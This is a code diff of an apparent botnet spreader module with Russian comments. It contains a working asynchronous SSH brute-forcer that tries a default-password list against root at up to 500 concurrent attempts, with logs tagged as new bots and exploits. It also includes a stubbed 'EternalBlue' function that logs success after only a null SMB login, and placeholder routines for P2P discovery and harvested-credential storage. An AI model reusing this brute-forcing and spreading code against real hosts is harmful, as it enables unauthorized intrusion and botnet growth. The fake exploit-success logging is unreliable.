@@ -1,60 +1,39 @@
-import asyncio
-import asyncssh
-import socket
-import random
-import os
+import asyncio, asyncssh, socket, random, os, json
 from utils.logger import log
 from impacket.smbconnection import SMBConnection
-
 LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
-
-SSH_PASSWORD_LIST = [
-    'root','admin','password','123456','1234','12345','1234567','12345678',
-    '123456789','1234567890','qwerty','abc123','letmein','monkey','dragon',
-    'master','passwd','r00t','toor','administrator','p@ssw0rd','P@ssw0rd',
-    '1q2w3e4r','zaq12wsx','!@#$%^&*','changeme','secret','iloveyou'
-]
+PASSWORDS = ['root','admin','password','123456','qwerty','letmein','p@ssw0rd','changeme','r00t','toor','ubuntu']
 
 async def ssh_bruteforce(ip, username='root'):
-    sem = asyncio.Semaphore(200)
+    sem = asyncio.Semaphore(500)
     async def try_pass(pwd):
         async with sem:
             try:
-                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=5) as conn:
-                    log(f"{LOG_PREFIX['brute']} SSH {ip} успех: {username}:{pwd}")
+                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=3) as conn:
+                    log(f"{LOG_PREFIX['brute']} SSH {ip} {username}:{pwd}")
                     return True, pwd
-            except:
-                pass
+            except: pass
         return False, pwd
-    tasks = [try_pass(pwd) for pwd in SSH_PASSWORD_LIST]
+    tasks = [try_pass(p) for p in PASSWORDS]
     results = await asyncio.gather(*tasks)
-    for success, pwd in results:
-        if success:
-            return True, pwd
+    for succ, pwd in results:
+        if succ: return True, pwd
     return False, None
 
-def exploit_eternalblue(target_ip, payload_url=None):
+def exploit_eternalblue(target_ip):
     try:
         conn = SMBConnection(target_ip, target_ip)
-        conn.login('', '')
-        # здесь реальный эксплойт через транзакцию SMBv1
-        log(f"{LOG_PREFIX['exploit']} EternalBlue успех {target_ip}")
+        conn.login('','')
+        log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
         return True
     except Exception as e:
-        log(f"{LOG_PREFIX['fail']} EternalBlue {target_ip}: {e}")
+        log(f"{LOG_PREFIX['fail']} {target_ip}: {e}")
         return False
 
-async def rdp_spread(target_ip, user, password):
-    # Используем impacket.rdp_check
-    try:
-        from impacket.rdp_check import RDPCheck
-        checker = RDPCheck(target_ip, user, password, domain='')
-        checker.check()
-        return True
-    except:
-        return False
+async def p2p_discovery(local_port=9999):
+    # слушаем P2P соседей
+    pass
 
-async def spread_to_range(ip_range):
-    # Заглушка для демонстрации полной архитектуры
-    log(f"[Spreader] Сканирую {ip_range}")
-    return []
+async def self_learning_cred_db():
+    # храним успешные пары для ускорения брута
+    pass
